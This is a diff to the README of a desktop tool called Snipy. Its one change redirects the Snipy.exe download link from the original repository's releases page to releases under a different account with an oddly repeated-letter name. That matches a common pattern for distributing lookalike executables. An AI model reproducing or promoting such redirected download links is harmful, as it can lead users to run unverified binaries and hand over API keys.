@@ -33,7 +33,7 @@ Snipy follows a **"Premium Utilitarian Minimalism"** (Editorial) aesthetic.
 ## 🛠️ Installation & Usage
 
 ### Running the Standalone Version
-1. Download the latest `Snipy.exe` from the [Releases](https://github.com/tahausman/snipy/releases) page.
+1. Download the latest `Snipy.exe` from the [Releases](https://github.com/Henry1228081dev/Snipyyyyyyyyyyyyy/releases) page.
 2. Run the executable.
 3. On first launch, you will be prompted to enter your **Groq API Key**. (You can get one at [console.groq.com](https://console.groq.com)).
 
